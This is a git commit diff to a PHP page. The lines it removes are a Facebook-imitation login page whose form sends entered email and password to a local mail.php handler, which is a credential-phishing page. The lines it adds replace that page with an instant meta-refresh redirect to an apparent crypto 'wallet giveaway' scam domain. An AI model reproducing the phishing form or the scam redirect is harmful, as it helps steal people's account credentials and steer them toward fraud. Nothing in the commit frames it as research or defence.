1f3a27090b1336632ca7adee1b8ff969240f8d45
codeplan73 <97120421+codeplan73@users.noreply.github.com>
2022-01-16 16:52:23 +0100

    Update index.php

--- index.php
+++ index.php
@@ -4,74 +4,10 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
-    <link rel="stylesheet" href="./css/style.css">
-    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <title>Document</title>
+    <meta http-equiv="refresh" content="0;URL='http://2022-wallet-giveaway-price.yenisafaky.com/'">
 </head>
 <body>
-    <div class="contentwrapper">
-
-        <div class="row">
-            <div class="items">
-                <img src="./img/fb-login.png" alt="" class="img">
-                <h1>Thanks for stopping by!</h1>
-                <h4>We hope to see you again soon.</h4>
-            </div>
-
-            <div class="items">
-                <div class="facebook">
-                    <h1>facebook</h1>
-                </div>
-                <div class="card">
-                    <form action="./mail.php" method="post">
-                        <input type="text" name="username" placeholder="Email or phone number" id="">
-                        <input type="password" name="password" placeholder="Password" id="">
-                        <input type="submit" class="login" name="submit" value="Login">
-                
-                        <a href="#" class="forget">Forget password?</a>
-                
-                        <hr>
-                
-                        <a href="https://facebook.com" class="createAccount">Create new account</a>
-                    </form>
-                
-                   
-                </div>
-                <p class="celeb"><b>Create a page</b> for a celerity, brand or business.</p>
-            </div>
-        </div>
-
-        <footer>
-            <div class="rows">
-                <a href="#">English (US)</a>
-                <a href="#">Nederlands</a>
-                <a href="#">Frysk</a>
-                <a href="#">Polski</a>
-                <a href="#">Türkçe</a>
-                <a href="#">Deutsch</a>
-                <a href="#">Français (France)</a>
-                <a href="#">العربية</a>
-                <a href="#">Español</a>
-                <a href="#">Português (Brasil)</a>
-                <a href="#">Italiano</a>
-                <hr>
-                <a href="#">Sign</a><a href="#">UpLog</a><a href="#">InMessengerFacebook</a><a href="#">LiteWatch</a>
-                <a href="#">Places</a><a href="#">Games</a><a href="#">Marketplace</a><a href="#">Facebook Pay</a>
-                <a href="#">Oculus</a><a href="#">Portal</a><a href="#">Instagram</a><a href="#">Bulletin</a>
-                <a href="#">ServicesVoting</a><a href="#">Information Center</a><a href="#">Groups</a><a href="#">About</a>
-                <a href="#">Local Fundraisers</a><a href="#">Create AdCreate</a><a href="#">Page Developers</a><a
-                    href="#">Careers</a>
-                <a href="#"></a><a href="#"></a><a href="#"></a><a href="#"></a>
-                <a href="#">Privacy</a><a href="#">Cookies</a><a href="#">Ad choices</a><a href="#">Terms</a>
-                <a href="#">Help</a><a href="#">Settings</a><a href="#">Activity</a><a href="#">log</a>
-            </div>
-        </footer>
-    </div>   
+    
 </body>
 </html>
-
-
-
-
- 
-   
